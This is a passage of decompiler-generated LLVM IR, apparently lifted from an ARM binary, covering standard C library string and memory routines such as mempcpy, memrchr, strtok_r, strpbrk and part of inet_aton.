dec_label_pc_14ecc:                               ; preds = %dec_label_pc_14ee8
  %v3_14ecc = load i8, i8* %.021, align 1
  %v4_14ecc = zext i8 %v3_14ecc to i32
  %v9_14ed0 = icmp eq i32 %v4_14ecc, %v1_14ec4
  %v1_14ed4 = add i32 %v0_14ed4, -1
  br i1 %v9_14ed0, label %bb, label %dec_label_pc_14ee0

bb:                                               ; preds = %dec_label_pc_14ecc
  ret i32 %v1_14ee8

dec_label_pc_14ee0:                               ; preds = %dec_label_pc_14ecc
  %v2_14edc = add i32 %v1_14ee8, 1
  %v3_14edc = inttoptr i32 %v2_14edc to i8*
  %v2_14ee0 = icmp eq i32 %v1_14ed4, 0
  br i1 %v2_14ee0, label %dec_label_pc_14ef0, label %dec_label_pc_14ee8

dec_label_pc_14ee8:                               ; preds = %entry, %dec_label_pc_14ee0
  %v0_14ed4 = phi i32 [ %v1_14ed4, %dec_label_pc_14ee0 ], [ %v0_14ee018, %entry ]
  %.021 = phi i8* [ %v3_14edc, %dec_label_pc_14ee0 ], [ undef, %entry ]
  %v1_14ee8 = ptrtoint i8* %.021 to i32
  %v2_14ee8 = urem i32 %v1_14ee8, 4
  %v3_14ee8 = icmp eq i32 %v2_14ee8, 0
  br i1 %v3_14ee8, label %dec_label_pc_14ef0, label %dec_label_pc_14ecc

dec_label_pc_14ef0:                               ; preds = %dec_label_pc_14ee0, %dec_label_pc_14ee8, %entry
  %v0_14f7c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_14ee0 ], [ %v0_14ed4, %dec_label_pc_14ee8 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_14edc, %dec_label_pc_14ee0 ], [ %.021, %dec_label_pc_14ee8 ]
  %v4_14ef0 = mul nuw nsw i32 %v1_14ec4, 256
  %v5_14ef0 = or i32 %v4_14ef0, %v1_14ec4
  %v1_14ef4 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_14ef4, i32* @ip, align 4
  %v4_14ef8 = mul i32 %v5_14ef0, 65536
  %v5_14ef8 = or i32 %v4_14ef8, %v5_14ef0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_14f7c37, 3
  br i1 %tmp, label %dec_label_pc_14f00, label %dec_label_pc_14fa4.preheader

dec_label_pc_14f00:                               ; preds = %dec_label_pc_14ef0, %dec_label_pc_14f7c.backedge
  %v0_14f1c82 = phi i32 [ %v1_14f1c, %dec_label_pc_14f7c.backedge ], [ %v0_14f7c37, %dec_label_pc_14ef0 ]
  %v0_14f0081 = phi i32 [ %v4_14f00, %dec_label_pc_14f7c.backedge ], [ %v1_14ef4, %dec_label_pc_14ef0 ]
  %v1_14f00 = inttoptr i32 %v0_14f0081 to i32*
  %v2_14f00 = load i32, i32* %v1_14f00, align 4
  %v4_14f00 = add i32 %v0_14f0081, 4
  store i32 %v4_14f00, i32* @ip, align 4
  %v2_14f04 = xor i32 %v2_14f00, %v5_14ef8
  %v2_14f08 = add i32 %v2_14f04, 2130640639
  %v1_14f0c = sub i32 -1, %v2_14f04
  %v2_14f10 = xor i32 %v2_14f08, %v1_14f0c
  %v2_14f14 = and i32 %v2_14f10, -2130640640
  %v2_14f18 = icmp eq i32 %v2_14f14, 0
  %v1_14f1c = add i32 %v0_14f1c82, -4
  br i1 %v2_14f18, label %dec_label_pc_14f7c.backedge, label %dec_label_pc_14f24

dec_label_pc_14f7c.backedge:                      ; preds = %dec_label_pc_14f00, %dec_label_pc_14f68
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_14f1c, 3
  br i1 %tmp107, label %dec_label_pc_14f00, label %dec_label_pc_14fa4.preheader

dec_label_pc_14f24:                               ; preds = %dec_label_pc_14f00
  %v2_14f24 = inttoptr i32 %v0_14f0081 to i8*
  %v3_14f24 = load i8, i8* %v2_14f24, align 1
  %v4_14f24 = zext i8 %v3_14f24 to i32
  %v9_14f2c = icmp eq i32 %v4_14f24, %v1_14ec4
  %v1_14f30 = add i32 %v0_14f0081, 3
  %v1_14f34 = add i32 %v0_14f0081, 1
  store i32 %v1_14f34, i32* @lr, align 4
  %v1_14f38 = add i32 %v0_14f0081, 2
  br i1 %v9_14f2c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_14f24
  store i32 %v3_14ec0, i32* @r4, align 4
  store i32 %v6_14ec0, i32* @r5, align 4
  store i32 %v9_14ec0, i32* @r6, align 4
  ret i32 %v0_14f0081

bb51:                                             ; preds = %dec_label_pc_14f24
  %v2_14f40 = inttoptr i32 %v1_14f34 to i8*
  %v3_14f40 = load i8, i8* %v2_14f40, align 1
  %v4_14f40 = zext i8 %v3_14f40 to i32
  %v9_14f44 = icmp eq i32 %v4_14f40, %v1_14ec4
  br i1 %v9_14f44, label %dec_label_pc_14f4c, label %dec_label_pc_14f54

dec_label_pc_14f4c:                               ; preds = %bb51
  store i32 %v3_14ec0, i32* @r4, align 4
  store i32 %v6_14ec0, i32* @r5, align 4
  store i32 %v9_14ec0, i32* @r6, align 4
  ret i32 %v1_14f34

dec_label_pc_14f54:                               ; preds = %bb51
  %v2_14f54 = inttoptr i32 %v1_14f38 to i8*
  %v3_14f54 = load i8, i8* %v2_14f54, align 1
  %v4_14f54 = zext i8 %v3_14f54 to i32
  %v9_14f58 = icmp eq i32 %v4_14f54, %v1_14ec4
  br i1 %v9_14f58, label %dec_label_pc_14f60, label %dec_label_pc_14f68

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14f54
  store i32 %v3_14ec0, i32* @r4, align 4
  store i32 %v6_14ec0, i32* @r5, align 4
  store i32 %v9_14ec0, i32* @r6, align 4
  ret i32 %v1_14f38

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14f54
  %v2_14f68 = inttoptr i32 %v1_14f30 to i8*
  %v3_14f68 = load i8, i8* %v2_14f68, align 1
  %v4_14f68 = zext i8 %v3_14f68 to i32
  %v9_14f6c = icmp eq i32 %v4_14f68, %v1_14ec4
  br i1 %v9_14f6c, label %dec_label_pc_14f74, label %dec_label_pc_14f7c.backedge

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14f68
  store i32 %v3_14ec0, i32* @r4, align 4
  store i32 %v6_14ec0, i32* @r5, align 4
  store i32 %v9_14ec0, i32* @r6, align 4
  ret i32 %v1_14f30

dec_label_pc_14fa4.preheader:                     ; preds = %dec_label_pc_14f7c.backedge, %dec_label_pc_14ef0
  %v0_14f00.lcssa = phi i32 [ %v1_14ef4, %dec_label_pc_14ef0 ], [ %v4_14f00, %dec_label_pc_14f7c.backedge ]
  %v0_14f1c.lcssa = phi i32 [ %v0_14f7c37, %dec_label_pc_14ef0 ], [ %v1_14f1c, %dec_label_pc_14f7c.backedge ]
  %v2_14fa411 = icmp eq i32 %v0_14f1c.lcssa, 0
  br i1 %v2_14fa411, label %dec_label_pc_14fac, label %dec_label_pc_14f94

dec_label_pc_14f94:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14fa4.preheader
  %v0_14fa4.in = phi i32 [ %v0_14fa4, %dec_label_pc_14fa4 ], [ %v0_14f1c.lcssa, %dec_label_pc_14fa4.preheader ]
  %v15_14f9c = phi i32 [ %v1_14fa0, %dec_label_pc_14fa4 ], [ %v0_14f00.lcssa, %dec_label_pc_14fa4.preheader ]
  %v0_14fa4 = add i32 %v0_14fa4.in, -1
  %v1_14f94 = inttoptr i32 %v15_14f9c to i8*
  %v2_14f94 = load i8, i8* %v1_14f94, align 1
  %v3_14f94 = zext i8 %v2_14f94 to i32
  %v9_14f98 = icmp eq i32 %v3_14f94, %v1_14ec4
  br i1 %v9_14f98, label %bb52, label %dec_label_pc_14fa4

bb52:                                             ; preds = %dec_label_pc_14f94
  store i32 %v3_14ec0, i32* @r4, align 4
  store i32 %v6_14ec0, i32* @r5, align 4
  store i32 %v9_14ec0, i32* @r6, align 4
  ret i32 %v15_14f9c

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14f94
  %v1_14fa0 = add i32 %v15_14f9c, 1
  %v2_14fa4 = icmp eq i32 %v0_14fa4, 0
  br i1 %v2_14fa4, label %dec_label_pc_14fac, label %dec_label_pc_14f94

dec_label_pc_14fac:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14fa4.preheader
  store i32 %v3_14ec0, i32* @r4, align 4
  store i32 %v6_14ec0, i32* @r5, align 4
  store i32 %v9_14ec0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_14f9c, { 1, 0, 2 }
  uselistorder i32 %v1_14f1c, { 1, 0, 2 }
  uselistorder i32 %v4_14f00, { 0, 2, 1 }
  uselistorder i32 %v0_14f0081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_14ef0, { 1, 0 }
  uselistorder i32 %v0_14f7c37, { 1, 2, 0 }
  uselistorder i32 %v1_14ec4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_14ec0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14f7c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14f00, { 1, 0 }
  uselistorder label %dec_label_pc_14ef0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ee8, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_14fc8 = call i32 @memcpy()
  %v0_14fcc = load i32, i32* @r5, align 4
  %v1_14fcc = load i32, i32* @r4, align 4
  %v2_14fcc = add i32 %v1_14fcc, %v0_14fcc
  ret i32 %v2_14fcc
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_14fd4 = load i32, i32* @r4, align 4
  %v1_14fd8 = urem i32 %arg2, 256
  %v2_14fdc = add i32 %arg3, %arg1
  %v2_14ff42 = icmp eq i32 %arg3, 0
  br i1 %v2_14ff42, label %dec_label_pc_15004, label %dec_label_pc_14ffc

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_14ffc
  %v1_14fe4 = add i32 %v0_14fe4, -1
  %v2_14fe4 = inttoptr i32 %v1_14fe4 to i8*
  %v3_14fe4 = load i8, i8* %v2_14fe4, align 1
  %v4_14fe4 = zext i8 %v3_14fe4 to i32
  %v9_14fe8 = icmp eq i32 %v4_14fe4, %v1_14fd8
  br i1 %v9_14fe8, label %bb, label %dec_label_pc_14ff4

bb:                                               ; preds = %dec_label_pc_14fe4
  ret i32 %v1_14fe4

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fe4
  %v1_14ff0 = add i32 %v0_14ff0, -1
  %v2_14ff4 = icmp eq i32 %v1_14ff0, 0
  br i1 %v2_14ff4, label %dec_label_pc_15004, label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %entry, %dec_label_pc_14ff4
  %v0_14ff0 = phi i32 [ %v1_14ff0, %dec_label_pc_14ff4 ], [ %arg3, %entry ]
  %v0_14fe4 = phi i32 [ %v1_14fe4, %dec_label_pc_14ff4 ], [ %v2_14fdc, %entry ]
  %v1_14ffc = urem i32 %v0_14fe4, 4
  %v2_14ffc = icmp eq i32 %v1_14ffc, 0
  br i1 %v2_14ffc, label %dec_label_pc_15004, label %dec_label_pc_14fe4

dec_label_pc_15004:                               ; preds = %dec_label_pc_14ff4, %dec_label_pc_14ffc, %entry
  %v0_1509c11 = phi i32 [ %v2_14fdc, %entry ], [ %v1_14fe4, %dec_label_pc_14ff4 ], [ %v0_14fe4, %dec_label_pc_14ffc ]
  %v0_150887 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_14ff4 ], [ %v0_14ff0, %dec_label_pc_14ffc ]
  %v4_15004 = mul nuw nsw i32 %v1_14fd8, 256
  %v5_15004 = or i32 %v4_15004, %v1_14fd8
  %v4_15008 = mul i32 %v5_15004, 65536
  %v5_15008 = or i32 %v4_15008, %v5_15004
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_150887, 3
  br i1 %tmp, label %dec_label_pc_15010, label %dec_label_pc_15098

dec_label_pc_15010:                               ; preds = %dec_label_pc_15004, %.backedge.backedge
  %v0_1502c51 = phi i32 [ %v1_1502c, %.backedge.backedge ], [ %v0_150887, %dec_label_pc_15004 ]
  %v0_1501050 = phi i32 [ %v1_15010, %.backedge.backedge ], [ %v0_1509c11, %dec_label_pc_15004 ]
  %v1_15010 = add i32 %v0_1501050, -4
  %v2_15010 = inttoptr i32 %v1_15010 to i32*
  %v3_15010 = load i32, i32* %v2_15010, align 4
  %v2_15014 = xor i32 %v3_15010, %v5_15008
  %v2_15018 = add i32 %v2_15014, 2130640639
  %v1_1501c = sub i32 -1, %v2_15014
  %v2_15020 = xor i32 %v2_15018, %v1_1501c
  %v2_15024 = and i32 %v2_15020, -2130640640
  %v2_15028 = icmp eq i32 %v2_15024, 0
  %v1_1502c = add i32 %v0_1502c51, -4
  br i1 %v2_15028, label %.backedge.backedge, label %dec_label_pc_15034

dec_label_pc_15034:                               ; preds = %dec_label_pc_15010
  %v1_15034 = add i32 %v0_1501050, -1
  %v2_15034 = inttoptr i32 %v1_15034 to i8*
  %v3_15034 = load i8, i8* %v2_15034, align 1
  %v4_15034 = zext i8 %v3_15034 to i32
  %v9_15038 = icmp eq i32 %v4_15034, %v1_14fd8
  %v1_1503c = add i32 %v0_1501050, -2
  store i32 %v1_1503c, i32* @ip, align 4
  %v1_15044 = add i32 %v0_1501050, -3
  store i32 %v1_15044, i32* @lr, align 4
  br i1 %v9_15038, label %dec_label_pc_1504c, label %dec_label_pc_15054

dec_label_pc_1504c:                               ; preds = %dec_label_pc_15034
  store i32 %v3_14fd4, i32* @r4, align 4
  ret i32 %v1_15034

dec_label_pc_15054:                               ; preds = %dec_label_pc_15034
  %v2_15054 = inttoptr i32 %v1_1503c to i8*
  %v3_15054 = load i8, i8* %v2_15054, align 1
  %v4_15054 = zext i8 %v3_15054 to i32
  %v9_15058 = icmp eq i32 %v4_15054, %v1_14fd8
  br i1 %v9_15058, label %dec_label_pc_15060, label %dec_label_pc_15068

dec_label_pc_15060:                               ; preds = %dec_label_pc_15054
  store i32 %v3_14fd4, i32* @r4, align 4
  ret i32 %v1_1503c

dec_label_pc_15068:                               ; preds = %dec_label_pc_15054
  %v2_15068 = inttoptr i32 %v1_15044 to i8*
  %v3_15068 = load i8, i8* %v2_15068, align 1
  %v4_15068 = zext i8 %v3_15068 to i32
  %v9_1506c = icmp eq i32 %v4_15068, %v1_14fd8
  br i1 %v9_1506c, label %dec_label_pc_15074, label %dec_label_pc_1507c

dec_label_pc_15074:                               ; preds = %dec_label_pc_15068
  store i32 %v3_14fd4, i32* @r4, align 4
  ret i32 %v1_15044

dec_label_pc_1507c:                               ; preds = %dec_label_pc_15068
  %v1_1507c = inttoptr i32 %v1_15010 to i8*
  %v2_1507c = load i8, i8* %v1_1507c, align 1
  %v3_1507c = zext i8 %v2_1507c to i32
  %v9_15080 = icmp eq i32 %v3_1507c, %v1_14fd8
  br i1 %v9_15080, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1507c, %dec_label_pc_15010
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1502c, 3
  br i1 %tmp70, label %dec_label_pc_15010, label %dec_label_pc_15098

bb19:                                             ; preds = %dec_label_pc_1507c
  store i32 %v3_14fd4, i32* @r4, align 4
  ret i32 %v1_15010

dec_label_pc_1509c:                               ; preds = %dec_label_pc_15098
  %v1_150a8 = add i32 %v0_150a8, -1
  %v1_1509c = add i32 %v0_1509c, -1
  %v2_1509c = inttoptr i32 %v1_1509c to i8*
  %v3_1509c = load i8, i8* %v2_1509c, align 1
  %v4_1509c = zext i8 %v3_1509c to i32
  %v9_150a0 = icmp eq i32 %v4_1509c, %v1_14fd8
  br i1 %v9_150a0, label %bb20, label %dec_label_pc_15098

bb20:                                             ; preds = %dec_label_pc_1509c
  store i32 %v3_14fd4, i32* @r4, align 4
  ret i32 %v1_1509c

dec_label_pc_15098:                               ; preds = %dec_label_pc_15004, %.backedge.backedge, %dec_label_pc_1509c
  %v0_1509c = phi i32 [ %v1_1509c, %dec_label_pc_1509c ], [ %v0_1509c11, %dec_label_pc_15004 ], [ %v1_15010, %.backedge.backedge ]
  %v0_150a8 = phi i32 [ %v1_150a8, %dec_label_pc_1509c ], [ %v0_150887, %dec_label_pc_15004 ], [ %v1_1502c, %.backedge.backedge ]
  %v2_150a8 = icmp eq i32 %v0_150a8, 0
  br i1 %v2_150a8, label %dec_label_pc_150b0, label %dec_label_pc_1509c

dec_label_pc_150b0:                               ; preds = %dec_label_pc_15098
  store i32 %v3_14fd4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_150a8, { 1, 0 }
  uselistorder i32 %v1_1502c, { 1, 0, 2 }
  uselistorder i32 %v1_15010, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1501050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15004, { 1, 0 }
  uselistorder i32 %v0_150887, { 1, 2, 0 }
  uselistorder i32 %v0_14fe4, { 1, 0, 2 }
  uselistorder i32 %v1_14fe4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14fdc, { 1, 0 }
  uselistorder i32 %v1_14fd8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_14fd4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 2, 4, 5, 3, 13, 7, 6, 12, 8, 14, 16, 15, 17, 0, 9, 1, 10, 18, 11 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15098, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15010, { 1, 0 }
  uselistorder label %dec_label_pc_15004, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ffc, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_150c0 = load i32, i32* @r4, align 4
  store i32 %v3_150c0, i32* %stack_var_-16, align 4
  %v6_150c0 = load i32, i32* @r5, align 4
  %v0_150c4 = load i32, i32* @r0, align 4
  store i32 %v0_150c4, i32* %r4.global-to-local, align 4
  %v2_150c4 = icmp eq i32 %v0_150c4, 0
  %v1_150c8 = load i32, i32* @r2, align 4
  br i1 %v2_150c4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_150c8 = inttoptr i32 %v1_150c8 to i32*
  %v3_150c8 = load i32, i32* %v2_150c8, align 4
  store i32 %v3_150c8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_150cc = phi i32 [ %v3_150c8, %bb ], [ %v0_150c4, %entry ]
  store i32 %v0_150cc, i32* @r0, align 4
  store i32 %v1_150c8, i32* @r5, align 4
  %v0_150d4 = load i32, i32* @r1, align 4
  store i32 %v0_150d4, i32* %r6.global-to-local, align 4
  %v1_150d8 = inttoptr i32 %v0_150cc to i8*
  %v2_150d8 = call i32 @__GI_strspn(i8* %v1_150d8)
  %v0_150dc = load i32, i32* %r4.global-to-local, align 4
  %v2_150dc = add i32 %v0_150dc, %v2_150d8
  %v3_150dc = inttoptr i32 %v2_150dc to i8*
  %v4_150dc = load i8, i8* %v3_150dc, align 1
  %v6_150dc = zext i8 %v4_150dc to i32
  store i32 %v6_150dc, i32* %r3.global-to-local, align 4
  store i32 %v2_150dc, i32* @r4, align 4
  %v2_150e4 = icmp eq i8 %v4_150dc, 0
  store i1 %v2_150e4, i1* @cpsr_z, align 1
  %v0_150e8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_150e8, i32* @r1, align 4
  store i32 %v2_150dc, i32* @r0, align 4
  br i1 %v2_150e4, label %bb7, label %dec_label_pc_150f8

bb7:                                              ; preds = %entry._crit_edge
  %v2_150f0 = load i32, i32* @r5, align 4
  %v3_150f0 = inttoptr i32 %v2_150f0 to i32*
  store i32 %v2_150dc, i32* %v3_150f0, align 4
  br label %dec_label_pc_1512c

dec_label_pc_150f8:                               ; preds = %entry._crit_edge
  %v0_150f8 = call i32 @__GI_strpbrk()
  store i32 %v0_150f8, i32* %r2.global-to-local, align 4
  %v3_150fc = icmp eq i32 %v0_150f8, 0
  store i1 %v3_150fc, i1* @cpsr_z, align 1
  br i1 %v3_150fc, label %dec_label_pc_1510c, label %dec_label_pc_1511c

dec_label_pc_1510c:                               ; preds = %dec_label_pc_150f8
  %v0_15104 = load i32, i32* @r4, align 4
  %v2_1510c = call i32 @rawmemchr(i32 %v0_15104, i32 0)
  %v0_15110 = load i32, i32* @r4, align 4
  store i32 %v0_15110, i32* %r3.global-to-local, align 4
  %v1_15114 = load i32, i32* @r5, align 4
  %v2_15114 = inttoptr i32 %v1_15114 to i32*
  store i32 %v2_1510c, i32* %v2_15114, align 4
  br label %dec_label_pc_1512c

dec_label_pc_1511c:                               ; preds = %dec_label_pc_150f8
  %v3_15120 = inttoptr i32 %v0_150f8 to i8*
  store i8 0, i8* %v3_15120, align 1
  %v4_15120 = load i32, i32* %r2.global-to-local, align 4
  %v5_15120 = add i32 %v4_15120, 1
  store i32 %v5_15120, i32* %r2.global-to-local, align 4
  %v1_15124 = load i32, i32* @r5, align 4
  %v2_15124 = inttoptr i32 %v1_15124 to i32*
  store i32 %v5_15120, i32* %v2_15124, align 4
  %v0_15128 = load i32, i32* @r4, align 4
  store i32 %v0_15128, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1512c

dec_label_pc_1512c:                               ; preds = %bb7, %dec_label_pc_1510c, %dec_label_pc_1511c
  %v0_1512c = load i32, i32* %r3.global-to-local, align 4
  %v2_15130 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15130, i32* @r4, align 4
  store i32 %v6_150c0, i32* @r5, align 4
  ret i32 %v0_1512c

; uselistorder directives
  uselistorder i32 %v0_150cc, { 1, 0 }
  uselistorder i32 %v0_150c4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1512c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_15134 = load i32, i32* @r0, align 4
  %v1_151582 = inttoptr i32 %v0_15134 to i8*
  %v2_151583 = load i8, i8* %v1_151582, align 1
  %v3_151584 = zext i8 %v2_151583 to i32
  %v2_1515c5 = icmp eq i8 %v2_151583, 0
  br i1 %v2_1515c5, label %dec_label_pc_15158._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_15164.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15144
  %v1_1514c = add i32 %v0_1514c, 1
  %v9_1513c = icmp eq i32 %v3_15144, %v3_151586
  br i1 %v9_1513c, label %dec_label_pc_1516c, label %dec_label_pc_15144

dec_label_pc_15144:                               ; preds = %dec_label_pc_1513c, %bb
  %v0_1514c = phi i32 [ %v1_1514c, %dec_label_pc_1513c ], [ %v0_15164.pre, %bb ]
  %v1_15144 = inttoptr i32 %v0_1514c to i8*
  %v2_15144 = load i8, i8* %v1_15144, align 1
  %v3_15144 = zext i8 %v2_15144 to i32
  store i32 %v3_15144, i32* @ip, align 4
  %v2_15148 = icmp eq i8 %v2_15144, 0
  br i1 %v2_15148, label %dec_label_pc_15154, label %dec_label_pc_1513c

dec_label_pc_15154:                               ; preds = %dec_label_pc_15144
  %v1_15154 = add i32 %v0_15154, 1
  %v1_15158 = inttoptr i32 %v1_15154 to i8*
  %v2_15158 = load i8, i8* %v1_15158, align 1
  %v3_15158 = zext i8 %v2_15158 to i32
  %v2_1515c = icmp eq i8 %v2_15158, 0
  br i1 %v2_1515c, label %dec_label_pc_15158._crit_edge, label %bb

dec_label_pc_15158._crit_edge:                    ; preds = %dec_label_pc_15154, %entry
  %v3_15158.lcssa = phi i32 [ %v3_151584, %entry ], [ %v3_15158, %dec_label_pc_15154 ]
  ret i32 %v3_15158.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_15154
  %v0_15154 = phi i32 [ %v0_15134, %.lr.ph ], [ %v1_15154, %dec_label_pc_15154 ]
  %v3_151586 = phi i32 [ %v3_151584, %.lr.ph ], [ %v3_15158, %dec_label_pc_15154 ]
  br label %dec_label_pc_15144

dec_label_pc_1516c:                               ; preds = %dec_label_pc_1513c
  ret i32 %v0_15154

; uselistorder directives
  uselistorder i32 %v3_15158, { 1, 0 }
  uselistorder i32 %v3_15144, { 1, 0 }
  uselistorder i32 %v0_1514c, { 1, 0 }
  uselistorder i32 %v3_151584, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_15144, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_15174 = load i32, i32* %r0.global-to-local, align 4
  %v2_15174 = icmp eq i32 %v0_15174, 0
  %v3_15178 = load i32, i32* @r4, align 4
  store i32 %v3_15178, i32* %stack_var_-20, align 4
  br i1 %v2_15174, label %dec_label_pc_15254, label %dec_label_pc_15190.lr.ph

dec_label_pc_15190:                               ; preds = %dec_label_pc_15190.lr.ph, %dec_label_pc_15214
  %v1_15214 = phi i32 [ 0, %dec_label_pc_15190.lr.ph ], [ %v5_15214, %dec_label_pc_15214 ]
  %v0_15218 = phi i32 [ 1, %dec_label_pc_15190.lr.ph ], [ %v1_15218, %dec_label_pc_15214 ]
  %v0_15198 = phi i32 [ %v0_15174, %dec_label_pc_15190.lr.ph ], [ %v0_1519825, %dec_label_pc_15214 ]
  store i32 %v2_15194.pre, i32* @lr, align 4
  %v1_15198 = inttoptr i32 %v0_15198 to i8*
  %v2_15198 = load i8, i8* %v1_15198, align 1
  %v3_15198 = zext i8 %v2_15198 to i32
  %v3_1519c = mul nuw nsw i32 %v3_15198, 2
  %v4_1519c = add i32 %v3_1519c, %v2_15194.pre
  %v5_1519c = inttoptr i32 %v4_1519c to i8*
  %v6_1519c = load i8, i8* %v5_1519c, align 1
  %v1_151a0 = and i8 %v6_1519c, 8
  %v2_151a0 = icmp eq i8 %v1_151a0, 0
  br i1 %v2_151a0, label %dec_label_pc_15254, label %dec_label_pc_151a8

dec_label_pc_151a8:                               ; preds = %dec_label_pc_15190
  br label %dec_label_pc_151c8

dec_label_pc_151b0:                               ; preds = %dec_label_pc_151c8
  %v3_151b4 = mul i32 %v0_15214, 10
  %v4_151b4 = add i32 %v3_151c8, %v3_151b4
  %v1_151b8 = add i32 %v4_151b4, -48
  %v8_151c0 = icmp sgt i32 %v1_151b8, 255
  br i1 %v8_151c0, label %dec_label_pc_15254, label %dec_label_pc_151c4

dec_label_pc_151c4:                               ; preds = %dec_label_pc_151b0
  %v1_151c4 = add i32 %v0_15204, 1
  store i32 %v1_151c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_151c8

dec_label_pc_151c8:                               ; preds = %dec_label_pc_151a8, %dec_label_pc_151c4
  %v0_15214 = phi i32 [ 0, %dec_label_pc_151a8 ], [ %v1_151b8, %dec_label_pc_151c4 ]
  %v0_15204 = phi i32 [ %v0_15198, %dec_label_pc_151a8 ], [ %v1_151c4, %dec_label_pc_151c4 ]
  %v1_151c8 = inttoptr i32 %v0_15204 to i8*
  %v2_151c8 = load i8, i8* %v1_151c8, align 1
  %v3_151c8 = zext i8 %v2_151c8 to i32
  store i32 %v3_151c8, i32* @ip, align 4
  %v2_151cc = mul nuw nsw i32 %v3_151c8, 2
  %v2_151d0 = add i32 %v2_151cc, %v2_15194.pre
  %v3_151d4 = inttoptr i32 %v2_151d0 to i8*
  %v4_151d4 = load i8, i8* %v3_151d4, align 1
  %v6_151d4 = zext i8 %v4_151d4 to i32
  %v1_151e0 = and i32 %v6_151d4, 8
  %v2_151e0 = icmp eq i32 %v1_151e0, 0
  br i1 %v2_151e0, label %dec_label_pc_151e8, label %dec_label_pc_151b0

dec_label_pc_151e8:                               ; preds = %dec_label_pc_151c8
  %v8_151ec = icmp sgt i32 %v0_15218, 3
  br i1 %v8_151ec, label %dec_label_pc_15200, label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151e8
  %v7_151f0 = icmp eq i8 %v2_151c8, 46
  br i1 %v7_151f0, label %dec_label_pc_151f8, label %dec_label_pc_15254

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151f0
  %v1_151f8 = add i32 %v0_15204, 1
  store i32 %v1_151f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15214

dec_label_pc_15200:                               ; preds = %dec_label_pc_151e8
  %v2_15200 = icmp eq i8 %v2_151c8, 0
  %v1_15204 = add i32 %v0_15204, 1
  store i32 %v1_15204, i32* %r0.global-to-local, align 4
  br i1 %v2_15200, label %dec_label_pc_15214, label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_15200
